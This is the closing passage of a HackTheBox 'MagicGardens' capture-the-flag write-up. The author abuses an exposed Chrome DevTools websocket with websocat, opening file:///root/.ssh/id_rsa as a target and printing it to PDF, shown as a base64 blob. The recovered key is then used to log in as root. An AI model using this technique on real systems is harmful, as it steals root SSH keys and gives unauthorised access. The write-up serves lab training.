+</span></span></code></pre></div><p>I was attempting to create a new target in the browser&rsquo;s DevTools by sending a JSON command through a WebSocket connection. I crafted a JSON string that included my desired method, &ldquo;Target.createTarget,&rdquo; along with the parameters specifying the URL of a local file, which happened to be my SSH private key stored at &ldquo;file:///root/.ssh/id_rsa.&rdquo; Using the <strong><code>websocat</code></strong> tool, I piped this command to the WebSocket server running at &ldquo;ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584.&rdquo; Upon execution, I received a response in JSON format, indicating success with a new target ID: &ldquo;151f6650-6d16-4d66-809b-f6dc06b2643b.&rdquo;</p>
+<p>After this, I ran this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;Page.printToPDF {}&#39;</span> <span class="p">|</span> ./websocat.x86_64-unknown-linux-musl -n1 --jsonrpc --jsonrpc-omit-jsonrpc ws://127.0.0.1:34001/devtools/page/151f6650-6d16-4d66-809b-f6dc06b2643b
+</span></span></code></pre></div><p>I was working on printing the contents of a webpage to a PDF using the DevTools protocol over a WebSocket connection. After successfully creating a target with the ID &ldquo;151f6650-6d16-4d66-809b-f6dc06b2643b,&rdquo; I prepared another command. This time, I needed to invoke the &ldquo;Page.printToPDF&rdquo; method to generate a PDF from the specified page. Using the <strong><code>websocat</code></strong> tool again, I sent the command in a JSON format without the &ldquo;jsonrpc&rdquo; field, which is a specific option for this tool. The WebSocket connection was established to the server at &ldquo;ws://127.0.0.1:34001/devtools/page/151f6650-6d16-4d66-809b-f6dc06b2643b.&rdquo; This command was executed with the intent of printing the page to a PDF, streamlining the process for further handling or saving the document locally.</p>
+<p>We received the following JSON file as a reply:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;result&#34;</span><span class="p">:{</span><span class="nt">&#34;data&#34;</span><span class="p">:</span><span class="s2">&#34;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&#34;</span><span class="p">,</span><span class="nt">&#34;stream&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}</span>
+</span></span></code></pre></div><p>All I did was copy the base64-encoded data and pasted it into <a href="https://base64.guru/converter/decode/pdf" target="_blank">https://base64.guru/converter/decode/pdf</a> to convert it from base64 to PDF format.</p>
+<p>Finally, I used the data from the resulting id_rsa file to log in as the root user. And obtained the both user flag and root flag altogether.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%208.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>With that, we successfully rooted the box, obtaining both the user flag and the root flag.</p>
+
+
+<h2 class="relative group">Conclusion 
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!</p>
+
+        </div>
+        
+        
+
+        
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/posts/hackthebox/magicgardens/&amp;text=MagicGardens%20Writeup%20-%20HackTheBox"
+      title="Tweet on Twitter"
+      aria-label="Tweet on Twitter"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/hackthebox/magicgardens/&amp;title=MagicGardens%20Writeup%20-%20HackTheBox"
+      title="Share on LinkedIn"
+      aria-label="Share on LinkedIn"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/hackthebox/magicgardens/&amp;quote=MagicGardens%20Writeup%20-%20HackTheBox"
+      title="Share on Facebook"
+      aria-label="Share on Facebook"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://api.whatsapp.com/send?text=http://localhost:1313/posts/hackthebox/magicgardens/&amp;resubmit=true&amp;title=MagicGardens%20Writeup%20-%20HackTheBox"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://t.me/share/url?url=http://localhost:1313/posts/hackthebox/magicgardens/&amp;resubmit=true&amp;title=MagicGardens%20Writeup%20-%20HackTheBox"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+  </section>
+
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/HackTheBox\/MagicGardens\/index.md"
+        var oid_likes = "likes_posts\/HackTheBox\/MagicGardens\/index.md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.b06a29d42a4ed16787978e2eee1e8c797b7698db2bc14ccee78f5c80ac566fc996190a73ad80a5e987558474b20b96fa38f7d85b405f165ff72b7b163c5ad11b.js" integrity="sha512-sGop1CpO0WeHl44u7h6MeXt2mNsrwUzO549cgKxWb8mWGQpzrYCl6YdVhHSyC5b6OPfYW0BfFl/3K3sWPFrRGw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/hackthebox/solarlab/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >SolarLab Writeup - HackTheBox</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-09-24 00:00:00 &#43;0000 UTC">24 September 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/hackthebox/editorial/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Editorial Writeup - HackTheBox</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-10-09 00:00:00 &#43;0000 UTC">9 October 2024</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      Rezy Dev
+    </p>
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
